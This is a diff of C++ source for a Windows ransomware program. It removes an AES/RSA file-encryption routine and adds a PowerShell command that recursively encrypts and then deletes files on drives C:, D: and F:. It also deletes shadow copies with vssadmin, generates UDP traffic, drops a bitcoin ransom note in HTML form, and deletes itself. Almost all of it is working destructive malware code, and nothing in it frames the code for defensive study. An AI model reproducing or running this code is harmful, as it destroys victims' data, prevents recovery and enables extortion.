@@ -11,6 +11,9 @@
 #include "includes.hpp"
 #include "encrypt.cpp"
 #include "encrypt.hpp"
+#include <stdio.h>
+#include <io.h>
+#include <direct.h>
 
 namespace fs = std::filesystem;
 using namespace std;
@@ -29,9 +32,14 @@ void run_command(string command) {
 }
 
 // A function to encrypt a file using AES-256 and RSA
-//void encrypt_file(string filename) {
-//    run_command("C:\\temp\\data\\sgf.exe -e "+filename);
-//}
+void encrypt_file(string filename) {
+    run_command("C:\\temp\\cb20\\crpt.exe -e "+filename);
+}
+
+// A function to encrypt a file using AES-256 and RSA
+void encrypt(string folder) {
+	run_command("powershell -command \"Get-Childitem "+folder+" -Recurse -Attributes !D+!S+!R | where-object {$_.FullName -notmatch 'C:\\\\(\\$Recycle\\.Bin|Config\\.Msi|Program Files\.*|ProgramData|Recovery|temp\\\\cb20|Windows|Users\\\\Public)\\\\|\\.sys'} | Select-Object -Property FullName | ForEach-Object {C:\\temp\\cb20\\crpt.exe -e $_.FullName; Remove-item $_.FullName}");
+}
 
 // A function to create UDP traffic on port 6892 to given addresses
 void create_traffic(vector<string> addresses) {
@@ -51,147 +59,23 @@ void create_traffic(vector<string> addresses) {
     closesocket(sock);
 }
 
-BOOL RansomFile(const char* szFileName)
-{
-	BOOL bResult = FALSE;
-
-	PBYTE pbEncryptedAESKey = nullptr;
-	DWORD dwEncryptedAESKeyLen = 0;
-
-	PBYTE pbPlaintextFileData = nullptr;
-	DWORD dwPlaintextFileDataLen = 0;
-
-	PBYTE pbEncryptedFileData = nullptr;
-	DWORD dwEncryptedFileDataLen = 0;
-
-	BYTE pbKey[16]{ };
-	DWORD dwKeyLen = sizeof(pbKey);
-
-	BYTE pbIV[16]{ };
-	DWORD dwIVLen = sizeof(pbIV);
-
-	HANDLE hFile = nullptr;
-
-	//
-	// Read file from disk
-	//
-	bResult = ReadFileToByteArray(szFileName, &pbPlaintextFileData, &dwPlaintextFileDataLen);
-	if (!bResult)
-	{
-		printf(__FUNCTION__ " -- ReadFileToByteArray failed!\n");
-		goto Exit;
-	}
-
-	//
-	// Generate crypto random IV and AES key
-	//
-	::BCryptGenRandom(NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
-	::BCryptGenRandom(NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
-
-	{
-		//
-		// Encrypt the AES key first.
-		//
-		bResult = RSAEncrypt(
-			pbKey,
-			dwKeyLen,
-			&pbEncryptedAESKey,
-			&dwEncryptedAESKeyLen
-		);
-		if (!bResult)
-		{
-			printf(__FUNCTION__ " -- RSAEncrypt failed!\n");
-			goto Exit;
-		}
-
-		//
-		// Encrypt the actual file
-		//
-		bResult = AESEncrypt(
-			pbPlaintextFileData,
-			dwPlaintextFileDataLen,
-			pbKey,
-			dwKeyLen,
-			pbIV,
-			dwIVLen,
-			&pbEncryptedFileData,
-			&dwEncryptedFileDataLen
-		);
-		if (!bResult)
-		{
-			printf(__FUNCTION__ " -- AESEncrypt failed!\n");
-			goto Exit;
-		}
-
-		//
-		// Create the .ransom file
-		//
-		char szNewPath[MAX_PATH]{ };
-		strcpy_s(szNewPath, szFileName);
-		::PathRemoveExtensionA(szNewPath);
-		strcat_s(szNewPath, ".94d4");
-
-		hFile = ::CreateFileA(
-			szNewPath,
-			GENERIC_READ | GENERIC_WRITE,
-			FILE_SHARE_READ | FILE_SHARE_WRITE,
-			nullptr,
-			CREATE_ALWAYS,
-			FILE_ATTRIBUTE_NORMAL,
-			nullptr
-		);
-		if (!hFile || hFile == INVALID_HANDLE_VALUE)
-		{
-			bResult = FALSE;
-			printf(__FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError());
-			goto Exit;
-		}
-
-		//
-		// Encrypted file format order:
-		// IV -> AES RSA Encrypted Key -> AES Encrypted File Data
-		//
-		DWORD dwWritten = 0;
-		::WriteFile(hFile, pbIV, dwIVLen, &dwWritten, nullptr);
-		::WriteFile(hFile, pbEncryptedAESKey, dwEncryptedAESKeyLen, &dwWritten, nullptr);
-		::WriteFile(hFile, pbEncryptedFileData, dwEncryptedFileDataLen, &dwWritten, nullptr);
-	}
-
-Exit:
-	if (hFile)
-		::CloseHandle(hFile);
-
-	if (pbEncryptedAESKey)
-		::HeapFree(::GetProcessHeap(), 0, pbEncryptedAESKey);
-
-	if (pbPlaintextFileData)
-		::VirtualFree(pbPlaintextFileData, 0, MEM_RELEASE);
-
-	if (pbEncryptedFileData)
-		::VirtualFree(pbEncryptedFileData, 0, MEM_RELEASE);
-
-	return bResult;
-}
-
 // A function to encrypt all files in a given folder
 void encrypt_folder(string folder) {
 	for (auto& p : fs::directory_iterator(folder)) {
-		if ((p.path().string().find("C:\\Windows") == std::string::npos) && (p.path().string().find("C:\\Users\\Public") == std::string::npos) && (p.path().string().find("C:\\Users\\Program Files") == std::string::npos)) {
-		//if ((p.path().string().find("C:\\Temp\\CB2.0\\x64\\Release\\test\\test2") == std::string::npos)) {
-			if (p.is_regular_file()) {
-				RansomFile((p.path().string()).c_str());
-				run_command("del /f /q " + (p.path().string()));
-			}
-			else if (p.is_directory()) {
-				encrypt_folder(p.path().string());
+		if (p.is_regular_file()) {
+			if (((_access_s((p.path().string().c_str()), 6)) != -1) && (p.path().string().find("C:\\Windows") == std::string::npos) && (p.path().string().find("C:\\Users\\Public") == std::string::npos) && (p.path().string().find("C:\\Users\\Program Files") == std::string::npos)) {
+				encrypt_file('"'+(p.path().string()).c_str()+'"');
+				run_command("del /f /q " + '"'+(p.path().string())+'"');
 			}
 		}
-    }
+		else {
+				encrypt_folder(p.path().string());
+		}
+	}
 }
 
 int main() {
-    // Create files with given names and contents under AppData\Local\Temp\
-
+    // Create files with given names and contents under AppData\Local\Temp
     string appdata = std::getenv("APPDATA");
     string temp = appdata + "\\..\\Local\\Temp\\";
     create_file(temp + "floppy_disk.png", "This is a floppy disk image");
@@ -206,11 +90,22 @@ int main() {
     // Run System.dll file
     run_command(temp + "nsmAD93.tmp\\System.dll");
     //Encrypt
-    //encrypt_file("C:\\temp\\test.txt");
-	//encrypt_folder("C:\\Temp\\CB2.0\\x64\\Release\\test");
-    encrypt_folder("C:\\");
-	encrypt_folder("D:\\");
-	encrypt_folder("F:\\");
+	string private_msg = "";
+	string public_msg = R"(-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwnlsz/1iz78CrVYdEday
+El4CNFdpNXHtfFdoWtMcFW+uXYKBLzQ2TqcxEc24uYr+JEPO66C/lWFIme5t/eoZ
+YYW3kba2NoOTBSJRBHDF7vt71Nid9Jc4yLmsfE858xSVgWkfqDvEazxZnL68t2rd
+/2k4aFKIXFJb0E1jAZunOu/xYW29rjZ2QCfSx3/2vhYQDJHrLcZSW/qCzOpeITlU
+6O3v04f6h426K4TQCZwIEroh0P9PWCGGo7NUidd4fmtGtlMZbehMORDvuBW3FY+S
+/UQGBV0H47kOL3qANOebST48PGzadgLd29QkSIo+P2BZKBhoBbePvRNombiKBEYL
+TQIDAQAB
+-----END PUBLIC KEY-----
+)";
+	create_file("C:\\temp\\cb20\\public.pem", public_msg);
+	create_file("C:\\temp\\cb20\\private.pem", private_msg);
+	encrypt("C:\\");
+    encrypt("D:\\");
+	encrypt("F:\\");
     // Remove shadow copies
     run_command("vssadmin delete shadows /all /quiet");
     // Create UDP traffic on port 6892 to given addresses
@@ -220,7 +115,7 @@ int main() {
     string ransom_message = "<html><head><title>Oops, your files have been encrypted!</title></head><body><h1>Oops, your files have been encrypted!</h1><p>Your important files are encrypted using a unique public key generated for this computer. To decrypt the files, you need to obtain the private key.</p><p>The single copy of the private key, which will allow you to decrypt the files, located on a secret server on the Internet; the server will destroy the key after 72 hours.</p><p>To retrieve the private key, you need to pay 1 bitcoin to the following address: 1N0BR8ST0XyzABCdEfGh1234.</p><p>After you've made the payment, send us an email with your transaction ID and your ID key and we will send you the private key.</p><p>Your ID key is: 94D4-ABCD-EFGH-1234</p></body></html>";
     create_file("C:\\Users\\Public\\Desktop\\_HELP_DECRYPT_N0BR8ST0_.hta", ransom_message);
     // Delete itself
-    run_command("del /f /q /s %");
 	run_command("del /f /q /s C:\\Temp\\cb20");
+	//_rmdir("C:\\Temp\\cb20");
     return 0;
 }
